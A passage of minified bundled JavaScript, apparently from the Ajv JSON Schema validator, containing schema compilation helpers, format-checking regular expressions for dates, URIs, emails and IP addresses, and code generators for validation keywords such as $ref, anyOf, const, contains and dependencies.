M1=Q.call(k,i1,S,G1);if(M1===void 0){var g1=$&&$[G1];if(g1)M1=Q.inlineRef(g1,E.inlineRefs)?g1:V.call(k,g1,S,$,r)}if(M1===void 0)b1(G1);else return S1(G1,M1),g(M1,Y1)}function X0(r,G1){var $1=y.length;return y[$1]=G1,a[r]=$1,"refVal"+$1}function b1(r){delete a[r]}function S1(r,G1){var $1=a[r];y[$1]=G1}function g(r,G1){return typeof r=="object"||typeof r=="boolean"?{code:G1,schema:r,inline:!0}:{code:G1,$async:r&&!!r.$async}}function X1(r){var G1=f[r];if(G1===void 0)G1=f[r]=p.length,p[G1]=r;return"pattern"+G1}function V1(r){switch(typeof r){case"boolean":case"number":return""+r;case"string":return Y.toQuotedString(r);case"object":if(r===null)return"null";var G1=z(r),$1=o[G1];if($1===void 0)$1=o[G1]=m.length,m[$1]=r;return"default"+$1}}function n(r,G1,$1,m1){if(k._opts.validateSchema!==!1){var t=r.definition.dependencies;if(t&&!t.every(function(G9){return Object.prototype.hasOwnProperty.call($1,G9)}))throw new Error("parent schema must have all required keywords: "+t.join(","));var Y1=r.definition.validateSchema;if(Y1){var Z1=Y1(G1);if(!Z1){var M1="keyword schema is invalid: "+k.errorsText(Y1.errors);if(k._opts.validateSchema=="log")k.logger.error(M1);else throw new Error(M1)}}}var g1=r.definition.compile,k1=r.definition.inline,J0=r.definition.macro,W0;if(g1)W0=g1.call(k,G1,$1,m1);else if(J0){if(W0=J0.call(k,G1,$1,m1),E.validateSchema!==!1)k.validateSchema(W0,!0)}else if(k1)W0=k1.call(k,m1,r.keyword,G1,$1);else if(W0=r.definition.validate,!W0)return;if(W0===void 0)throw new Error('custom keyword "'+r.keyword+'"failed to compile');var I0=J1.length;return J1[I0]=W0,{code:"customRule"+I0,validate:W0}}}function B(D,S,$){var T=M.call(this,D,S,$);if(T>=0)return{index:T,compiling:!0};return T=this._compilations.length,this._compilations[T]={schema:D,root:S,baseId:$},{index:T,compiling:!1}}function Z(D,S,$){var T=M.call(this,D,S,$);if(T>=0)this._compilations.splice(T,1)}function M(D,S,$){for(var T=0;T<this._compilations.length;T++){var k=this._compilations[T];if(k.schema==D&&k.root==S&&k.baseId==$)return T}return-1}function F(D,S){return"var pattern"+D+" = new RegExp("+Y.toQuotedString(S[D])+");"}function j(D){return"var default"+D+" = defaults["+D+"];"}function O(D,S){return S[D]===void 0?"":"var refVal"+D+" = refVal["+D+"];"}function N(D){return"var customRule"+D+" = customRules["+D+"];"}function A(D,S){if(!D.length)return"";var $="";for(var T=0;T<D.length;T++)$+=S(T,D);return $}}),ax1=Y0((X,J)=>{var Q=J.exports=function Y(){this._cache={}};Q.prototype.put=function Y(W,z){this._cache[W]=z},Q.prototype.get=function Y(W){return this._cache[W]},Q.prototype.del=function Y(W){delete this._cache[W]},Q.prototype.clear=function Y(){this._cache={}}}),sx1=Y0((X,J)=>{var Q=w7(),Y=/^(\d\d\d\d)-(\d\d)-(\d\d)$/,W=[0,31,28,31,30,31,30,31,31,30,31,30,31],z=/^(\d\d):(\d\d):(\d\d)(\.\d+)?(z|[+-]\d\d(?::?\d\d)?)?$/i,G=/^(?=.{1,253}\.?$)[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[-0-9a-z]{0,61}[0-9a-z])?)*\.?$/i,H=/^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'()*+,;=:@]|%[0-9a-f]{2})*)*)(?:\?(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i,U=/^(?:[a-z][a-z0-9+\-.]*:)?(?:\/?\/(?:(?:[a-z0-9\-._~!$&'()*+,;=:]|%[0-9a-f]{2})*@)?(?:\[(?:(?:(?:(?:[0-9a-f]{1,4}:){6}|::(?:[0-9a-f]{1,4}:){5}|(?:[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){4}|(?:(?:[0-9a-f]{1,4}:){0,1}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){3}|(?:(?:[0-9a-f]{1,4}:){0,2}[0-9a-f]{1,4})?::(?:[0-9a-f]{1,4}:){2}|(?:(?:[0-9a-f]{1,4}:){0,3}[0-9a-f]{1,4})?::[0-9a-f]{1,4}:|(?:(?:[0-9a-f]{1,4}:){0,4}[0-9a-f]{1,4})?::)(?:[0-9a-f]{1,4}:[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?))|(?:(?:[0-9a-f]{1,4}:){0,5}[0-9a-f]{1,4})?::[0-9a-f]{1,4}|(?:(?:[0-9a-f]{1,4}:){0,6}[0-9a-f]{1,4})?::)|[Vv][0-9a-f]+\.[a-z0-9\-._~!$&'()*+,;=:]+)\]|(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)|(?:[a-z0-9\-._~!$&'"()*+,;=]|%[0-9a-f]{2})*)(?::\d*)?(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*|\/(?:(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?|(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})+(?:\/(?:[a-z0-9\-._~!$&'"()*+,;=:@]|%[0-9a-f]{2})*)*)?(?:\?(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?(?:#(?:[a-z0-9\-._~!$&'"()*+,;=:@/?]|%[0-9a-f]{2})*)?$/i,K=/^(?:(?:[^\x00-\x20"'<>%\\^`{|}]|%[0-9a-f]{2})|\{[+#./;?&=,!@|]?(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?(?:,(?:[a-z0-9_]|%[0-9a-f]{2})+(?::[1-9][0-9]{0,3}|\*)?)*\})*$/i,V=/^(?:(?:http[s\u017F]?|ftp):\/\/)(?:(?:[\0-\x08\x0E-\x1F!-\x9F\xA1-\u167F\u1681-\u1FFF\u200B-\u2027\u202A-\u202E\u2030-\u205E\u2060-\u2FFF\u3001-\uD7FF\uE000-\uFEFE\uFF00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])+(?::(?:[\0-\x08\x0E-\x1F!-\x9F\xA1-\u167F\u1681-\u1FFF\u200B-\u2027\u202A-\u202E\u2030-\u205E\u2060-\u2FFF\u3001-\uD7FF\uE000-\uFEFE\uFF00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])*)?@)?(?:(?!10(?:\.[0-9]{1,3}){3})(?!127(?:\.[0-9]{1,3}){3})(?!169\.254(?:\.[0-9]{1,3}){2})(?!192\.168(?:\.[0-9]{1,3}){2})(?!172\.(?:1[6-9]|2[0-9]|3[01])(?:\.[0-9]{1,3}){2})(?:[1-9][0-9]?|1[0-9][0-9]|2[01][0-9]|22[0-3])(?:\.(?:1?[0-9]{1,2}|2[0-4][0-9]|25[0-5])){2}(?:\.(?:[1-9][0-9]?|1[0-9][0-9]|2[0-4][0-9]|25[0-4]))|(?:(?:(?:[0-9a-z\xA1-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])+-)*(?:[0-9a-z\xA1-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])+)(?:\.(?:(?:[0-9a-z\xA1-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])+-)*(?:[0-9a-z\xA1-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])+)*(?:\.(?:(?:[a-z\xA1-\uD7FF\uE000-\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]){2,})))(?::[0-9]{2,5})?(?:\/(?:[\0-\x08\x0E-\x1F!-\x9F\xA1-\u167F\u1681-\u1FFF\u200B-\u2027\u202A-\u202E\u2030-\u205E\u2060-\u2FFF\u3001-\uD7FF\uE000-\uFEFE\uFF00-\uFFFF]|[\uD800-\uDBFF][\uDC00-\uDFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF])*)?$/i,B=/^(?:urn:uuid:)?[0-9a-f]{8}-(?:[0-9a-f]{4}-){3}[0-9a-f]{12}$/i,Z=/^(?:\/(?:[^~/]|~0|~1)*)*$/,M=/^#(?:\/(?:[a-z0-9_\-.!$&'()*+,;:=@]|%[0-9a-f]{2}|~0|~1)*)*$/i,F=/^(?:0|[1-9][0-9]*)(?:#|(?:\/(?:[^~/]|~0|~1)*)*)$/;J.exports=j;function j(y){return y=y=="full"?"full":"fast",Q.copy(j[y])}j.fast={date:/^\d\d\d\d-[0-1]\d-[0-3]\d$/,time:/^(?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)?$/i,"date-time":/^\d\d\d\d-[0-1]\d-[0-3]\d[t\s](?:[0-2]\d:[0-5]\d:[0-5]\d|23:59:60)(?:\.\d+)?(?:z|[+-]\d\d(?::?\d\d)?)$/i,uri:/^(?:[a-z][a-z0-9+\-.]*:)(?:\/?\/)?[^\s]*$/i,"uri-reference":/^(?:(?:[a-z][a-z0-9+\-.]*:)?\/?\/)?(?:[^\\\s#][^\s#]*)?(?:#[^\\\s]*)?$/i,"uri-template":K,url:V,email:/^[a-z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*$/i,hostname:G,ipv4:/^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/,ipv6:/^\s*(?:(?:(?:[0-9a-f]{1,4}:){7}(?:[0-9a-f]{1,4}|:))|(?:(?:[0-9a-f]{1,4}:){6}(?::[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(?:(?:[0-9a-f]{1,4}:){5}(?:(?:(?::[0-9a-f]{1,4}){1,2})|:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(?:(?:[0-9a-f]{1,4}:){4}(?:(?:(?::[0-9a-f]{1,4}){1,3})|(?:(?::[0-9a-f]{1,4})?:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){3}(?:(?:(?::[0-9a-f]{1,4}){1,4})|(?:(?::[0-9a-f]{1,4}){0,2}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){2}(?:(?:(?::[0-9a-f]{1,4}){1,5})|(?:(?::[0-9a-f]{1,4}){0,3}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){1}(?:(?:(?::[0-9a-f]{1,4}){1,6})|(?:(?::[0-9a-f]{1,4}){0,4}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?::(?:(?:(?::[0-9a-f]{1,4}){1,7})|(?:(?::[0-9a-f]{1,4}){0,5}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(?:%.+)?\s*$/i,regex:E,uuid:B,"json-pointer":Z,"json-pointer-uri-fragment":M,"relative-json-pointer":F},j.full={date:N,time:A,"date-time":S,uri:T,"uri-reference":U,"uri-template":K,url:V,email:/^[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i,hostname:G,ipv4:/^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/,ipv6:/^\s*(?:(?:(?:[0-9a-f]{1,4}:){7}(?:[0-9a-f]{1,4}|:))|(?:(?:[0-9a-f]{1,4}:){6}(?::[0-9a-f]{1,4}|(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(?:(?:[0-9a-f]{1,4}:){5}(?:(?:(?::[0-9a-f]{1,4}){1,2})|:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(?:(?:[0-9a-f]{1,4}:){4}(?:(?:(?::[0-9a-f]{1,4}){1,3})|(?:(?::[0-9a-f]{1,4})?:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){3}(?:(?:(?::[0-9a-f]{1,4}){1,4})|(?:(?::[0-9a-f]{1,4}){0,2}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){2}(?:(?:(?::[0-9a-f]{1,4}){1,5})|(?:(?::[0-9a-f]{1,4}){0,3}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?:(?:[0-9a-f]{1,4}:){1}(?:(?:(?::[0-9a-f]{1,4}){1,6})|(?:(?::[0-9a-f]{1,4}){0,4}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(?::(?:(?:(?::[0-9a-f]{1,4}){1,7})|(?:(?::[0-9a-f]{1,4}){0,5}:(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(?:%.+)?\s*$/i,regex:E,uuid:B,"json-pointer":Z,"json-pointer-uri-fragment":M,"relative-json-pointer":F};function O(y){return y%4===0&&(y%100!==0||y%400===0)}function N(y){var a=y.match(Y);if(!a)return!1;var p=+a[1],f=+a[2],m=+a[3];return f>=1&&f<=12&&m>=1&&m<=(f==2&&O(p)?29:W[f])}function A(y,a){var p=y.match(z);if(!p)return!1;var f=p[1],m=p[2],o=p[3],J1=p[5];return(f<=23&&m<=59&&o<=59||f==23&&m==59&&o==60)&&(!a||J1)}var D=/t|\s/i;function S(y){var a=y.split(D);return a.length==2&&N(a[0])&&A(a[1],!0)}var $=/\/|:/;function T(y){return $.test(y)&&H.test(y)}var k=/[^\\]\\Z/;function E(y){if(k.test(y))return!1;try{return new RegExp(y),!0}catch(a){return!1}}}),ox1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.errSchemaPath+"/"+W,B=!Y.opts.allErrors,Z="data"+(U||""),M="valid"+H,F,j;if(K=="#"||K=="#/")if(Y.isRoot)F=Y.async,j="validate";else F=Y.root.schema.$async===!0,j="root.refVal[0]";else{var O=Y.resolveRef(Y.baseId,K,Y.isRoot);if(O===void 0){var N=Y.MissingRefError.message(Y.baseId,K);if(Y.opts.missingRefs=="fail"){Y.logger.error(N);var A=A||[];if(A.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: '$ref' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(V)+" , params: { ref: '"+Y.util.escapeQuotes(K)+"' } ",Y.opts.messages!==!1)G+=" , message: 'can\\'t resolve reference "+Y.util.escapeQuotes(K)+"' ";if(Y.opts.verbose)G+=" , schema: "+Y.util.toQuotedString(K)+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+Z+" ";G+=" } "}else G+=" {} ";var D=G;if(G=A.pop(),!Y.compositeRule&&B)if(Y.async)G+=" throw new ValidationError(["+D+"]); ";else G+=" validate.errors = ["+D+"]; return false; ";else G+=" var err = "+D+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(B)G+=" if (false) { "}else if(Y.opts.missingRefs=="ignore"){if(Y.logger.warn(N),B)G+=" if (true) { "}else throw new Y.MissingRefError(Y.baseId,K,N)}else if(O.inline){var S=Y.util.copy(Y);S.level++;var $="valid"+S.level;S.schema=O.schema,S.schemaPath="",S.errSchemaPath=K;var T=Y.validate(S).replace(/validate\.schema/g,O.code);if(G+=" "+T+" ",B)G+=" if ("+$+") { "}else F=O.$async===!0||Y.async&&O.$async!==!1,j=O.code}if(j){var A=A||[];if(A.push(G),G="",Y.opts.passContext)G+=" "+j+".call(this, ";else G+=" "+j+"( ";if(G+=" "+Z+", (dataPath || '')",Y.errorPath!='""')G+=" + "+Y.errorPath;var k=U?"data"+(U-1||""):"parentData",E=U?Y.dataPathArr[U]:"parentDataProperty";G+=" , "+k+" , "+E+", rootData)  ";var y=G;if(G=A.pop(),F){if(!Y.async)throw new Error("async schema referenced by sync schema");if(B)G+=" var "+M+"; ";if(G+=" try { await "+y+"; ",B)G+=" "+M+" = true; ";if(G+=" } catch (e) { if (!(e instanceof ValidationError)) throw e; if (vErrors === null) vErrors = e.errors; else vErrors = vErrors.concat(e.errors); errors = vErrors.length; ",B)G+=" "+M+" = false; ";if(G+=" } ",B)G+=" if ("+M+") { "}else if(G+=" if (!"+y+") { if (vErrors === null) vErrors = "+j+".errors; else vErrors = vErrors.concat("+j+".errors); errors = vErrors.length; } ",B)G+=" else { "}return G}}),tx1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.schema[W],U=Y.schemaPath+Y.util.getProperty(W),K=Y.errSchemaPath+"/"+W,V=!Y.opts.allErrors,B=Y.util.copy(Y),Z="";B.level++;var M="valid"+B.level,F=B.baseId,j=!0,O=H;if(O){var N,A=-1,D=O.length-1;while(A<D)if(N=O[A+=1],Y.opts.strictKeywords?typeof N=="object"&&Object.keys(N).length>0||N===!1:Y.util.schemaHasRules(N,Y.RULES.all)){if(j=!1,B.schema=N,B.schemaPath=U+"["+A+"]",B.errSchemaPath=K+"/"+A,G+="  "+Y.validate(B)+" ",B.baseId=F,V)G+=" if ("+M+") { ",Z+="}"}}if(V)if(j)G+=" if (true) { ";else G+=" "+Z.slice(0,-1)+" ";return G}}),ex1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j="errs__"+H,O=Y.util.copy(Y),N="";O.level++;var A="valid"+O.level,D=K.every(function(a){return Y.opts.strictKeywords?typeof a=="object"&&Object.keys(a).length>0||a===!1:Y.util.schemaHasRules(a,Y.RULES.all)});if(D){var S=O.baseId;G+=" var "+j+" = errors; var "+F+" = false;  ";var $=Y.compositeRule;Y.compositeRule=O.compositeRule=!0;var T=K;if(T){var k,E=-1,y=T.length-1;while(E<y)k=T[E+=1],O.schema=k,O.schemaPath=V+"["+E+"]",O.errSchemaPath=B+"/"+E,G+="  "+Y.validate(O)+" ",O.baseId=S,G+=" "+F+" = "+F+" || "+A+"; if (!"+F+") { ",N+="}"}if(Y.compositeRule=O.compositeRule=$,G+=" "+N+" if (!"+F+") {   var err =   ",Y.createErrors!==!1){if(G+=" { keyword: 'anyOf' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: 'should match some schema in anyOf' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";if(G+=";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ",!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(vErrors); ";else G+=" validate.errors = vErrors; return false; ";if(G+=" } else {  errors = "+j+"; if (vErrors !== null) { if ("+j+") vErrors.length = "+j+"; else vErrors = null; } ",Y.opts.allErrors)G+=" } "}else if(Z)G+=" if (true) { ";return G}}),Xf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.schema[W],U=Y.errSchemaPath+"/"+W,K=!Y.opts.allErrors,V=Y.util.toQuotedString(H);if(Y.opts.$comment===!0)G+=" console.log("+V+");";else if(typeof Y.opts.$comment=="function")G+=" self._opts.$comment("+V+", "+Y.util.toQuotedString(U)+", validate.root.schema);";return G}}),Jf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j=Y.opts.$data&&K&&K.$data,O;if(j)G+=" var schema"+H+" = "+Y.util.getData(K.$data,U,Y.dataPathArr)+"; ",O="schema"+H;else O=K;if(!j)G+=" var schema"+H+" = validate.schema"+V+";";G+="var "+F+" = equal("+M+", schema"+H+"); if (!"+F+") {   ";var N=N||[];if(N.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'const' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { allowedValue: schema"+H+" } ",Y.opts.messages!==!1)G+=" , message: 'should be equal to constant' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var A=G;if(G=N.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+A+"]); ";else G+=" validate.errors = ["+A+"]; return false; ";else G+=" var err = "+A+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" }",Z)G+=" else { ";return G}}),Qf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="valid"+H,j="errs__"+H,O=Y.util.copy(Y),N="";O.level++;var A="valid"+O.level,D="i"+H,S=O.dataLevel=Y.dataLevel+1,$="data"+S,T=Y.baseId,k=Y.opts.strictKeywords?typeof K=="object"&&Object.keys(K).length>0||K===!1:Y.util.schemaHasRules(K,Y.RULES.all);if(G+="var "+j+" = errors;var "+F+";",k){var E=Y.compositeRule;Y.compositeRule=O.compositeRule=!0,O.schema=K,O.schemaPath=V,O.errSchemaPath=B,G+=" var "+A+" = false; for (var "+D+" = 0; "+D+" < "+M+".length; "+D+"++) { ",O.errorPath=Y.util.getPathExpr(Y.errorPath,D,Y.opts.jsonPointers,!0);var y=M+"["+D+"]";O.dataPathArr[S]=D;var a=Y.validate(O);if(O.baseId=T,Y.util.varOccurences(a,$)<2)G+=" "+Y.util.varReplace(a,$,y)+" ";else G+=" var "+$+" = "+y+"; "+a+" ";G+=" if ("+A+") break; }  ",Y.compositeRule=O.compositeRule=E,G+=" "+N+" if (!"+A+") {"}else G+=" if ("+M+".length == 0) {";var p=p||[];if(p.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'contains' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: {} ",Y.opts.messages!==!1)G+=" , message: 'should contain a valid item' ";if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: validate.schema"+Y.schemaPath+" , data: "+M+" ";G+=" } "}else G+=" {} ";var f=G;if(G=p.pop(),!Y.compositeRule&&Z)if(Y.async)G+=" throw new ValidationError(["+f+"]); ";else G+=" validate.errors = ["+f+"]; return false; ";else G+=" var err = "+f+";  if (vErrors === null) vErrors = [err]; else vErrors.push(err); errors++; ";if(G+=" } else { ",k)G+="  errors = "+j+"; if (vErrors !== null) { if ("+j+") vErrors.length = "+j+"; else vErrors = null; } ";if(Y.opts.allErrors)G+=" } ";return G}}),Yf1=Y0((X,J)=>{J.exports=function Q(Y,W,z){var G=" ",H=Y.level,U=Y.dataLevel,K=Y.schema[W],V=Y.schemaPath+Y.util.getProperty(W),B=Y.errSchemaPath+"/"+W,Z=!Y.opts.allErrors,M="data"+(U||""),F="errs__"+H,j=Y.util.copy(Y),O="";j.level++;var N="valid"+j.level,A={},D={},S=Y.opts.ownProperties;for(E in K){if(E=="__proto__")continue;var $=K[E],T=Array.isArray($)?D:A;T[E]=$}G+="var "+F+" = errors;";var k=Y.errorPath;G+="var missing"+H+";";for(var E in D)if(T=D[E],T.length){if(G+=" if ( "+M+Y.util.getProperty(E)+" !== undefined ",S)G+=" && Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(E)+"') ";if(Z){G+=" && ( ";var y=T;if(y){var a,p=-1,f=y.length-1;while(p<f){if(a=y[p+=1],p)G+=" || ";var m=Y.util.getProperty(a),o=M+m;if(G+=" ( ( "+o+" === undefined ",S)G+=" || ! Object.prototype.hasOwnProperty.call("+M+", '"+Y.util.escapeQuotes(a)+"') ";G+=") && (missing"+H+" = "+Y.util.toQuotedString(Y.opts.jsonPointers?a:m)+") ) "}}G+=")) {  ";var J1="missing"+H,H1="' + "+J1+" + '";if(Y.opts._errorDataPathProperty)Y.errorPath=Y.opts.jsonPointers?Y.util.getPathExpr(k,J1,!0):k+" + "+J1;var d=d||[];if(d.push(G),G="",Y.createErrors!==!1){if(G+=" { keyword: 'dependencies' , dataPath: (dataPath || '') + "+Y.errorPath+" , schemaPath: "+Y.util.toQuotedString(B)+" , params: { property: '"+Y.util.escapeQuotes(E)+"', missingProperty: '"+H1+"', depsCount: "+T.length+", deps: '"+Y.util.escapeQuotes(T.length==1?T[0]:T.join(", "))+"' } ",Y.opts.messages!==!1){if(G+=" , message: 'should have ",T.length==1)G+="property "+Y.util.escapeQuotes(T[0]);else G+="properties "+Y.util.escapeQuotes(T.join(", "));G+=" when property "+Y.util.escapeQuotes(E)+" is present' "}if(Y.opts.verbose)G+=" , schema: validate.schema"+V+" , parentSchema: 